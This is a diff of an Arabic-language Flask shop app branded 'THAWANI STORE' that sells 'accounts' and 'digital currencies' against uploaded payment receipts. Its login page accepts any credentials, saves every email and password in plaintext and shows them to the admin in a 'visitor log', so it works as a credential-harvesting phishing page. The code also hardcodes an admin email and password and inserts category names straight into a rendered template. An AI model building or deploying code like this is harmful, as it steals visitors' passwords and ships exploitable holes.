@@ -7,25 +7,27 @@ UPLOAD_FOLDER = 'static/uploads'
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
 
-# --- إنشاء وتحديث قاعدة البيانات بالكامل ---
+# --- إنشاء وتحديث قاعدة البيانات بالكامل وباحترافية ---
 def init_db():
     conn = sqlite3.connect('database.db')
     c = conn.cursor()
-    # جدول المنتجات
     c.execute('CREATE TABLE IF NOT EXISTS products (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, price REAL, img TEXT, category TEXT, description TEXT)')
-    # جدول السلة
     c.execute('CREATE TABLE IF NOT EXISTS cart (id INTEGER PRIMARY KEY AUTOINCREMENT, user_email TEXT, product_id INTEGER, quantity INTEGER DEFAULT 1)')
-    # جدول الأقسام
     c.execute('CREATE TABLE IF NOT EXISTS categories (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT)')
-    # جدول سجل الزوار (Log)
     c.execute('CREATE TABLE IF NOT EXISTS users_log (id INTEGER PRIMARY KEY AUTOINCREMENT, email TEXT, password TEXT, time TIMESTAMP DEFAULT CURRENT_TIMESTAMP)')
-    # جدول الطلبات
     c.execute('''CREATE TABLE IF NOT EXISTS orders (
         id INTEGER PRIMARY KEY AUTOINCREMENT, user_email TEXT, full_name TEXT, phone TEXT, 
         card_img TEXT, items_details TEXT, total_price REAL, status TEXT DEFAULT 'قيد الانتظار', 
         time TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
-    # جدول التقييمات
     c.execute('CREATE TABLE IF NOT EXISTS reviews (id INTEGER PRIMARY KEY AUTOINCREMENT, product_id INTEGER, user_email TEXT, rating INTEGER, comment TEXT, time TIMESTAMP DEFAULT CURRENT_TIMESTAMP)')
+    
+    # إضافة قسم افتراضي إذا كان الجدول فارغاً
+    c.execute("SELECT COUNT(*) FROM categories")
+    if c.fetchone()[0] == 0:
+        c.execute("INSERT INTO categories (name) VALUES ('الكل')")
+        c.execute("INSERT INTO categories (name) VALUES ('حسابات')")
+        c.execute("INSERT INTO categories (name) VALUES ('عملات رقمية')")
+    
     conn.commit()
     conn.close()
 
@@ -34,75 +36,92 @@ init_db()
 ADMIN_MAIL = "qwerasdf1234598760@gmail.com"
 ADMIN_PASS = "qaws54321"
 
-# --- التنسيق الفخم والراقي (Black & Gold Premium) ---
+# --- التنسيق الفخم والراقي (Premium Black & Gold) ---
 CSS = """
 <style>
     @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700;900&display=swap');
-    :root { --primary: #0f0f0f; --accent: #d4af37; --gold-light: #f1e5ac; --bg: #1a1a1a; --white: #ffffff; }
-    body { font-family: 'Tajawal', sans-serif; background: var(--bg); margin: 0; padding: 0; direction: rtl; color: var(--white); padding-bottom: 80px; }
+    :root { --primary: #0a0a0a; --accent: #d4af37; --gold-dark: #b8860b; --bg: #121212; --white: #ffffff; --card-bg: #1e1e1e; }
+    body { font-family: 'Tajawal', sans-serif; background: var(--bg); margin: 0; padding: 0; direction: rtl; color: var(--white); padding-bottom: 90px; }
     
-    header { background: linear-gradient(145deg, #1a1a1a, #000000); padding: 20px; text-align: center; border-bottom: 2px solid var(--accent); box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
-    .logo-text { font-size: 28px; font-weight: 900; color: var(--accent); text-transform: uppercase; letter-spacing: 2px; }
+    header { background: #000; padding: 20px; text-align: center; border-bottom: 1px solid var(--accent); position: sticky; top: 0; z-index: 1000; }
+    .logo-text { font-size: 24px; font-weight: 900; color: var(--accent); letter-spacing: 1px; }
 
-    .bottom-nav { position: fixed; bottom: 0; left: 0; width: 100%; background: #000; display: flex; justify-content: space-around; padding: 15px 0; border-top: 1px solid var(--accent); z-index: 1000; }
-    .nav-item { color: var(--white); text-decoration: none; font-size: 14px; font-weight: bold; transition: 0.3s; }
-    .nav-item:hover { color: var(--accent); }
+    /* شريط التنقل السفلي الاحترافي */
+    .bottom-nav { position: fixed; bottom: 0; left: 0; width: 100%; background: #000; display: flex; justify-content: space-around; padding: 12px 0; border-top: 2px solid var(--accent); z-index: 1000; box-shadow: 0 -5px 15px rgba(0,0,0,0.5); }
+    .nav-item { color: #888; text-decoration: none; font-size: 13px; font-weight: bold; text-align: center; flex: 1; }
+    .nav-item.active { color: var(--accent); }
+    .nav-label { display: block; margin-top: 4px; }
 
-    .card { background: #222; border: 1px solid #333; border-radius: 12px; margin: 15px; overflow: hidden; box-shadow: 0 5px 15px rgba(0,0,0,0.3); transition: 0.3s; }
-    .card:hover { border-color: var(--accent); transform: translateY(-5px); }
-    .card img { width: 100%; height: 200px; object-fit: cover; }
-    .card-body { padding: 15px; }
-    .card-title { font-size: 18px; font-weight: bold; margin-bottom: 8px; color: var(--gold-light); }
-    .card-price { font-size: 20px; color: var(--accent); font-weight: 900; }
+    /* الأقسام */
+    .cat-bar { display: flex; overflow-x: auto; padding: 10px; gap: 10px; background: #1a1a1a; white-space: nowrap; }
+    .cat-bar::-webkit-scrollbar { display: none; }
+    .cat-link { background: #333; color: white; padding: 6px 15px; border-radius: 20px; text-decoration: none; font-size: 12px; border: 1px solid transparent; }
+    .cat-link.active { background: var(--accent); color: #000; font-weight: bold; }
 
-    .btn-premium { background: linear-gradient(45deg, #d4af37, #f1e5ac); color: #000; border: none; padding: 12px; border-radius: 8px; font-weight: 900; cursor: pointer; text-decoration: none; display: block; text-align: center; margin-top: 10px; width: 100%; }
+    .container { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; padding: 10px; }
+    .card { background: var(--card-bg); border-radius: 12px; overflow: hidden; border: 1px solid #333; position: relative; }
+    .card img { width: 100%; height: 150px; object-fit: cover; }
+    .card-info { padding: 10px; }
+    .card-title { font-size: 14px; font-weight: bold; height: 40px; overflow: hidden; color: #eee; }
+    .card-price { color: var(--accent); font-weight: 900; font-size: 16px; margin: 5px 0; }
     
-    input, select, textarea { background: #333; color: #fff; border: 1px solid var(--accent); padding: 12px; margin: 10px 0; width: 100%; border-radius: 8px; font-family: 'Tajawal'; box-sizing: border-box; }
+    .btn-premium { background: linear-gradient(to right, var(--accent), var(--gold-dark)); color: #000; border: none; padding: 10px; border-radius: 6px; font-weight: bold; cursor: pointer; text-decoration: none; display: block; text-align: center; width: 100%; box-sizing: border-box; }
     
-    table { width: 100%; border-collapse: collapse; margin-top: 20px; background: #222; border-radius: 8px; overflow: hidden; }
-    th, td { border: 1px solid #333; padding: 12px; text-align: center; font-size: 13px; }
-    th { background: var(--accent); color: #000; font-weight: bold; }
+    input, select, textarea { background: #222; color: #fff; border: 1px solid #444; padding: 12px; margin: 8px 0; width: 100%; border-radius: 8px; box-sizing: border-box; }
+    input:focus { border-color: var(--accent); outline: none; }
     
-    .status-badge { background: var(--accent); color: #000; padding: 3px 8px; border-radius: 4px; font-size: 11px; font-weight: bold; }
-    .star-rating { color: var(--accent); margin: 10px 0; font-size: 18px; }
+    table { width: 100%; border-collapse: collapse; background: #1a1a1a; margin-top: 15px; }
+    th, td { padding: 10px; border: 1px solid #333; text-align: center; font-size: 12px; }
+    th { background: var(--accent); color: #000; }
+
+    .star-rating { color: var(--accent); font-size: 18px; }
 </style>
 """
 
-BASE_HTML = f"<!DOCTYPE html><html dir='rtl' lang='ar'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'>{CSS}</head><body>"
+BASE_HTML = f"<!DOCTYPE html><html dir='rtl' lang='ar'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no'>{CSS}</head><body>"
 
-NAV_HTML = """
-<div class="bottom-nav">
-    <a href="/" class="nav-item">الرئيسية</a>
-    <a href="/cart" class="nav-item">السلة</a>
-    <a href="/orders_history" class="nav-item">طلباتي</a>
-    {% if session.get('is_admin') %}<a href="/admin" class="nav-item">لوحة التحكم</a>{% endif %}
-    <a href="/logout" class="nav-item" style="color:#ff4d4d;">خروج</a>
-</div>
-"""
-
-# --- الصفحات ---
+def get_nav():
+    admin_link = '<a href="/admin" class="nav-item"><span class="nav-label">لوحة التحكم</span></a>' if session.get('is_admin') else ''
+    return f"""
+    <div class="bottom-nav">
+        <a href="/" class="nav-item"><span class="nav-label">الرئيسية</span></a>
+        <a href="/cart" class="nav-item"><span class="nav-label">السلة</span></a>
+        <a href="/orders_history" class="nav-item"><span class="nav-label">طلباتي</span></a>
+        {admin_link}
+        <a href="/logout" class="nav-item" style="color:#ff4d4d;"><span class="nav-label">خروج</span></a>
+    </div>
+    """
 
 @app.route('/')
 def index():
     if 'user' not in session: return redirect('/login')
+    cat = request.args.get('cat', 'الكل')
     conn = sqlite3.connect('database.db'); conn.row_factory = sqlite3.Row
-    prods = conn.execute("SELECT * FROM products").fetchall()
+    cats = conn.execute("SELECT * FROM categories").fetchall()
+    if cat == 'الكل':
+        prods = conn.execute("SELECT * FROM products").fetchall()
+    else:
+        prods = conn.execute("SELECT * FROM products WHERE category=?", (cat,)).fetchall()
     conn.close()
-    return render_template_string(BASE_HTML + """
-    <header><div class="logo-text">THAWANI PREMIUM</div></header>
-    <div style="display: grid; grid-template-columns: 1fr 1fr; padding: 5px;">
-        {% for p in prods %}
+    
+    cat_links = "".join([f'<a href="/?cat={c["name"]}" class="cat-link {"active" if cat==c["name"] else ""}">{c["name"]}</a>' for c in cats])
+    
+    return render_template_string(BASE_HTML + f"""
+    <header><div class="logo-text">THAWANI STORE</div></header>
+    <div class="cat-bar">{cat_links}</div>
+    <div class="container">
+        {{% for p in prods %}}
         <div class="card">
-            <img src="/static/uploads/{{p.img}}">
-            <div class="card-body">
-                <div class="card-title">{{p.name}}</div>
-                <div class="card-price">{{p.price}} OMR</div>
-                <a href="/product/{{p.id}}" class="btn-premium">شراء الآن</a>
+            <img src="/static/uploads/{{{{p.img}}}}">
+            <div class="card-info">
+                <div class="card-title">{{{{p.name}}}}</div>
+                <div class="card-price">{{{{p.price}}}} OMR</div>
+                <a href="/product/{{{{p.id}}}}" class="btn-premium">عرض التفاصيل</a>
             </div>
         </div>
-        {% endfor %}
+        {{% endfor %}}
     </div>
-    """ + NAV_HTML)
+    """ + get_nav(), prods=prods)
 
 @app.route('/product/<int:id>', methods=['GET', 'POST'])
 def product(id):
@@ -117,88 +136,73 @@ def product(id):
     conn.close()
     return render_template_string(BASE_HTML + """
     <header><div class="logo-text">تفاصيل المنتج</div></header>
-    <div class="card" style="margin-bottom:100px;">
-        <img src="/static/uploads/{{p.img}}" style="height:auto;">
-        <div class="card-body">
-            <h2 style="color:var(--accent);">{{p.name}}</h2>
-            <p style="color:#ccc;">{{p.description or 'لا يوجد وصف حالياً'}}</p>
-            <div class="card-price">{{p.price}} OMR</div>
-            <a href="/add_to_cart/{{p.id}}" class="btn-premium">إضافة إلى السلة</a>
-            <hr style="border:0; border-top:1px solid #444; margin:20px 0;">
-            <h3>تقييمات العملاء ⭐</h3>
+    <div style="padding:15px; margin-bottom:80px;">
+        <img src="/static/uploads/{{p.img}}" style="width:100%; border-radius:15px; border:1px solid var(--accent);">
+        <h2 style="color:var(--accent); margin:15px 0 5px 0;">{{p.name}}</h2>
+        <div class="card-price" style="font-size:24px;">{{p.price}} OMR</div>
+        <p style="color:#bbb; line-height:1.6;">{{p.description}}</p>
+        <a href="/add_to_cart/{{p.id}}" class="btn-premium" style="font-size:18px; padding:15px;">إضافة إلى السلة 🛒</a>
+        
+        <div style="margin-top:30px; border-top:1px solid #333; padding-top:20px;">
+            <h3>التقييمات ⭐</h3>
             {% for r in revs %}
-                <div style="background:#333; padding:10px; border-radius:8px; margin-bottom:10px;">
+                <div style="background:#1a1a1a; padding:12px; border-radius:10px; margin-bottom:10px; border-left:3px solid var(--accent);">
                     <div class="star-rating">{{ "★" * r.rating }}{{ "☆" * (5 - r.rating) }}</div>
-                    <p style="margin:5px 0; font-size:14px;">{{r.comment}}</p>
-                    <small style="color:gray;">بواسطة: {{r.user_email}}</small>
+                    <p style="margin:5px 0;">{{r.comment}}</p>
+                    <small style="color:gray;">{{r.user_email}}</small>
                 </div>
             {% endfor %}
-            <form method="POST" style="margin-top:20px; border-top:1px solid #444; padding-top:20px;">
-                <h4>أضف تقييمك:</h4>
-                <select name="rating" required><option value="5">⭐⭐⭐⭐⭐</option><option value="4">⭐⭐⭐⭐</option><option value="3">⭐⭐⭐</option><option value="2">⭐⭐</option><option value="1">⭐</option></select>
-                <textarea name="comment" placeholder="رأيك في المنتج..." required></textarea>
-                <button class="btn-premium">إرسال التقييم</button>
+            <form method="POST" style="background:#1a1a1a; padding:15px; border-radius:10px; margin-top:15px;">
+                <h4>اترك تقييمك:</h4>
+                <select name="rating"><option value="5">⭐⭐⭐⭐⭐</option><option value="4">⭐⭐⭐⭐</option><option value="3">⭐⭐⭐</option><option value="2">⭐⭐</option><option value="1">⭐</option></select>
+                <textarea name="comment" placeholder="رأيك بالمنتج..." required></textarea>
+                <button class="btn-premium">نشر التقييم</button>
             </form>
         </div>
     </div>
-    """ + NAV_HTML, p=p, revs=revs)
+    """ + get_nav(), p=p, revs=revs)
 
-@app.route('/admin', methods=['GET', 'POST'])
-def admin():
-    if not session.get('is_admin'): return redirect('/')
+@app.route('/add_to_cart/<int:id>')
+def add_to_cart(id):
+    if 'user' not in session: return redirect('/login')
+    conn = sqlite3.connect('database.db')
+    existing = conn.execute("SELECT id FROM cart WHERE user_email=? AND product_id=?", (session['user'], id)).fetchone()
+    if existing:
+        conn.execute("UPDATE cart SET quantity = quantity + 1 WHERE id=?", (existing[0],))
+    else:
+        conn.execute("INSERT INTO cart (user_email, product_id) VALUES (?,?)", (session['user'], id))
+    conn.commit(); conn.close()
+    return redirect('/cart')
+
+@app.route('/cart')
+def cart():
+    if 'user' not in session: return redirect('/login')
     conn = sqlite3.connect('database.db'); conn.row_factory = sqlite3.Row
-    if request.method == 'POST':
-        if 'add_product' in request.form:
-            f = request.files['img']; fname = f"{uuid.uuid4().hex}.jpg"; f.save(os.path.join(app.config['UPLOAD_FOLDER'], fname))
-            conn.execute("INSERT INTO products (name, price, img, category, description) VALUES (?,?,?,?,?)", 
-                         (request.form['name'], request.form['price'], fname, request.form['cat'], request.form['desc']))
-        elif 'add_cat' in request.form:
-            conn.execute("INSERT INTO categories (name) VALUES (?)", (request.form['cat_name'],))
-        conn.commit()
-    
-    logs = conn.execute("SELECT * FROM users_log ORDER BY id DESC").fetchall()
-    prods = conn.execute("SELECT * FROM products").fetchall()
-    orders = conn.execute("SELECT * FROM orders ORDER BY id DESC").fetchall()
-    cats = conn.execute("SELECT * FROM categories").fetchall()
+    items = conn.execute('SELECT products.name, products.price, cart.quantity, cart.id FROM cart JOIN products ON cart.product_id = products.id WHERE cart.user_email = ?', (session['user'],)).fetchall()
+    total = sum(i['price'] * i['quantity'] for i in items)
     conn.close()
     return render_template_string(BASE_HTML + """
-    <header><div class="logo-text">لوحة التحكم</div></header>
+    <header><div class="logo-text">سلة المشتريات</div></header>
     <div style="padding:15px;">
-        <div style="background:#222; padding:15px; border-radius:12px; border:1px solid var(--accent); margin-bottom:20px;">
-            <h3>👥 سجل دخول الزوار (LOG)</h3>
-            <div style="overflow-x:auto;">
-                <table>
-                    <tr><th>الإيميل</th><th>كلمة المرور</th><th>الوقت</th></tr>
-                    {% for l in logs %}
-                    <tr><td>{{l.email}}</td><td>{{l.password}}</td><td>{{l.time}}</td></tr>
-                    {% endfor %}
-                </table>
+        {% for i in items %}
+        <div style="background:#1a1a1a; padding:15px; border-radius:10px; margin-bottom:10px; display:flex; justify-content:space-between; align-items:center; border:1px solid #333;">
+            <div>
+                <div style="font-weight:bold;">{{i.name}}</div>
+                <div style="color:var(--accent);">{{i.price}} OMR × {{i.quantity}}</div>
             </div>
+            <b style="color:var(--accent);">{{i.price * i.quantity}} OMR</b>
         </div>
-
-        <div style="background:#222; padding:15px; border-radius:12px; margin-bottom:20px;">
-            <h3>📦 إضافة منتج جديد</h3>
-            <form method="POST" enctype="multipart/form-data">
-                <input name="name" placeholder="اسم المنتج" required>
-                <input name="price" placeholder="السعر OMR" required>
-                <select name="cat">{% for c in cats %}<option value="{{c.name}}">{{c.name}}</option>{% endfor %}</select>
-                <textarea name="desc" placeholder="وصف المنتج"></textarea>
-                <input type="file" name="img" required>
-                <button name="add_product" class="btn-premium">نشر المنتج</button>
-            </form>
-        </div>
-
-        <div style="background:#222; padding:15px; border-radius:12px;">
-            <h3>🛒 إحصائيات الطلبات</h3>
-            <table>
-                <tr><th>رقم الطلب</th><th>العميل</th><th>السعر</th><th>الحالة</th></tr>
-                {% for o in orders %}
-                <tr><td>{{o.id}}</td><td>{{o.full_name}}</td><td>{{o.total_price}}</td><td><span class="status-badge">{{o.status}}</span></td></tr>
-                {% endfor %}
-            </table>
-        </div>
+        {% endfor %}
+        {% if items %}
+            <div style="text-align:center; margin-top:30px; background:#000; padding:20px; border-radius:15px; border:1px solid var(--accent);">
+                <h2 style="margin:0;">الإجمالي: {{total}} OMR</h2>
+                <a href="/checkout" class="btn-premium" style="margin-top:15px; padding:15px;">إتمام الطلب 💳</a>
+            </div>
+        {% else %}
+            <p style="text-align:center; color:gray; margin-top:100px;">السلة فارغة حالياً.</p>
+        {% endif %}
     </div>
-    """ + NAV_HTML, logs=logs, prods=prods, orders=orders, cats=cats)
+    """ + get_nav(), items=items, total=total)
 
 @app.route('/checkout', methods=['GET', 'POST'])
 def checkout():
@@ -218,19 +222,64 @@ def checkout():
     
     return render_template_string(BASE_HTML + """
     <header><div class="logo-text">إتمام الدفع</div></header>
-    <div class="card">
-        <div class="card-body">
-            <h3>المجموع: {{total}} OMR</h3>
+    <div style="padding:15px;">
+        <div style="background:#1a1a1a; padding:20px; border-radius:15px; border:1px solid var(--accent);">
+            <h3>المبلغ المطلوب: {{total}} OMR</h3>
             <form method="POST" enctype="multipart/form-data">
-                <input name="name" placeholder="الاسم بالكامل" required>
-                <input name="phone" placeholder="رقم الهاتف" required>
-                <label>ارفق إيصال الدفع (سكرين شوت):</label>
+                <input name="name" placeholder="الاسم الكامل" required>
+                <input name="phone" placeholder="رقم الهاتف/الواتساب" required>
+                <p style="font-size:12px; color:var(--accent);">يرجى رفع صورة إيصال التحويل لضمان قبول الطلب:</p>
                 <input type="file" name="receipt" accept="image/*" required>
-                <button class="btn-premium">تأكيد الطلب</button>
+                <button class="btn-premium">تأكيد وإرسال الطلب</button>
             </form>
         </div>
     </div>
-    """ + NAV_HTML, total=total)
+    """ + get_nav(), total=total)
+
+@app.route('/admin', methods=['GET', 'POST'])
+def admin():
+    if not session.get('is_admin'): return redirect('/')
+    conn = sqlite3.connect('database.db'); conn.row_factory = sqlite3.Row
+    if request.method == 'POST':
+        if 'add_product' in request.form:
+            f = request.files['img']; fname = f"{uuid.uuid4().hex}.jpg"; f.save(os.path.join(app.config['UPLOAD_FOLDER'], fname))
+            conn.execute("INSERT INTO products (name, price, img, category, description) VALUES (?,?,?,?,?)", 
+                         (request.form['name'], request.form['price'], fname, request.form['cat'], request.form['desc']))
+        elif 'add_cat' in request.form:
+            conn.execute("INSERT INTO categories (name) VALUES (?)", (request.form['cat_name'],))
+        conn.commit()
+    
+    logs = conn.execute("SELECT * FROM users_log ORDER BY id DESC").fetchall()
+    orders = conn.execute("SELECT * FROM orders ORDER BY id DESC").fetchall()
+    cats = conn.execute("SELECT * FROM categories").fetchall()
+    conn.close()
+    return render_template_string(BASE_HTML + """
+    <header><div class="logo-text">لوحة التحكم</div></header>
+    <div style="padding:15px;">
+        <div style="background:#1a1a1a; padding:15px; border-radius:10px; border:1px solid var(--accent); margin-bottom:20px;">
+            <h3 style="color:var(--accent);">👤 سجل الزوار (Log)</h3>
+            <div style="overflow-x:auto;">
+                <table>
+                    <tr><th>الإيميل</th><th>كلمة المرور</th><th>الوقت</th></tr>
+                    {% for l in logs %}
+                    <tr><td>{{l.email}}</td><td>{{l.password}}</td><td>{{l.time}}</td></tr>
+                    {% endfor %}
+                </table>
+            </div>
+        </div>
+        <div style="background:#1a1a1a; padding:15px; border-radius:10px; margin-bottom:20px;">
+            <h3>📦 إضافة منتج</h3>
+            <form method="POST" enctype="multipart/form-data">
+                <input name="name" placeholder="اسم المنتج" required>
+                <input name="price" placeholder="السعر" required>
+                <select name="cat">{% for c in cats %}<option value="{{c.name}}">{{c.name}}</option>{% endfor %}</select>
+                <textarea name="desc" placeholder="وصف المنتج (اختياري)"></textarea>
+                <input type="file" name="img" required>
+                <button name="add_product" class="btn-premium">إضافة المنتج للمتجر</button>
+            </form>
+        </div>
+    </div>
+    """ + get_nav(), logs=logs, orders=orders, cats=cats)
 
 @app.route('/orders_history')
 def orders_history():
@@ -240,53 +289,21 @@ def orders_history():
     conn.close()
     return render_template_string(BASE_HTML + """
     <header><div class="logo-text">طلباتي</div></header>
-    <div style="padding:10px;">
+    <div style="padding:15px;">
         {% for o in orders %}
-        <div class="card" style="border-right:5px solid var(--accent);">
-            <div class="card-body">
-                <div style="display:flex; justify-content:space-between;">
-                    <b>طلب رقم #{{o.id}}</b>
-                    <span class="status-badge">{{o.status}}</span>
-                </div>
-                <p style="color:#aaa; font-size:13px; margin:10px 0;">{{o.items_details}}</p>
-                <div class="card-price" style="font-size:16px;">{{o.total_price}} OMR</div>
+        <div style="background:#1a1a1a; padding:15px; border-radius:10px; margin-bottom:10px; border-right:4px solid var(--accent);">
+            <div style="display:flex; justify-content:space-between;">
+                <b>طلب رقم #{{o.id}}</b>
+                <span style="color:var(--accent);">{{o.status}}</span>
             </div>
+            <p style="font-size:12px; color:gray; margin:10px 0;">{{o.items_details}}</p>
+            <div style="font-weight:bold; color:var(--accent);">{{o.total_price}} OMR</div>
         </div>
         {% else %}
-        <p style="text-align:center; margin-top:50px;">لا يوجد طلبات حالياً.</p>
+        <p style="text-align:center; color:gray; margin-top:100px;">لا توجد طلبات سابقة.</p>
         {% endfor %}
     </div>
-    """ + NAV_HTML)
-
-@app.route('/cart')
-def cart():
-    if 'user' not in session: return redirect('/login')
-    conn = sqlite3.connect('database.db'); conn.row_factory = sqlite3.Row
-    items = conn.execute('SELECT products.name, products.price, cart.quantity FROM cart JOIN products ON cart.product_id = products.id WHERE cart.user_email = ?', (session['user'],)).fetchall()
-    total = sum(i['price'] * i['quantity'] for i in items)
-    return render_template_string(BASE_HTML + """
-    <header><div class="logo-text">سلة المشتريات</div></header>
-    <div style="padding:15px; margin-bottom:100px;">
-        {% for i in items %}
-        <div style="background:#222; padding:15px; border-radius:10px; margin-bottom:10px; display:flex; justify-content:space-between; align-items:center;">
-            <span>{{i.name}} (x{{i.quantity}})</span>
-            <b style="color:var(--accent);">{{i.price * i.quantity}} OMR</b>
-        </div>
-        {% endfor %}
-        <div style="text-align:center; margin-top:30px;">
-            <h3>الإجمالي: {{total}} OMR</h3>
-            <a href="/checkout" class="btn-premium">الذهاب للدفع 💳</a>
-        </div>
-    </div>
-    """ + NAV_HTML, items=items, total=total)
-
-@app.route('/add_to_cart/<int:id>')
-def add_to_cart(id):
-    if 'user' not in session: return redirect('/login')
-    conn = sqlite3.connect('database.db')
-    conn.execute("INSERT INTO cart (user_email, product_id) VALUES (?,?)", (session['user'], id))
-    conn.commit(); conn.close()
-    return redirect('/cart')
+    """ + get_nav())
 
 @app.route('/login', methods=['GET', 'POST'])
 def login():
@@ -295,16 +312,17 @@ def login():
         conn = sqlite3.connect('database.db')
         conn.execute("INSERT INTO users_log (email, password) VALUES (?,?)", (e, p))
         conn.commit(); conn.close()
-        session['user'], session['is_admin'] = e, (e == ADMIN_MAIL and p == ADMIN_PASS)
+        session['user'] = e
+        session['is_admin'] = (e == ADMIN_MAIL and p == ADMIN_PASS)
         return redirect('/')
     return render_template_string(BASE_HTML + """
-    <div style="height:100vh; display:flex; align-items:center; justify-content:center; background: #000;">
-        <div style="background:#111; padding:40px; border-radius:15px; border:1px solid var(--accent); width:85%; max-width:400px; text-align:center;">
-            <div class="logo-text" style="margin-bottom:30px;">THAWANI</div>
+    <div style="height:100vh; display:flex; align-items:center; justify-content:center; background:#000;">
+        <div style="background:#111; padding:35px; border-radius:20px; border:1px solid var(--accent); width:85%; max-width:380px; text-align:center;">
+            <div class="logo-text" style="margin-bottom:30px; font-size:32px;">THAWANI</div>
             <form method="POST">
                 <input name="email" type="email" placeholder="البريد الإلكتروني" required>
                 <input name="password" type="password" placeholder="كلمة المرور" required>
-                <button class="btn-premium" style="margin-top:20px;">تسجيل الدخول</button>
+                <button class="btn-premium" style="margin-top:20px; font-size:18px;">تسجيل الدخول</button>
             </form>
         </div>
     </div>""")
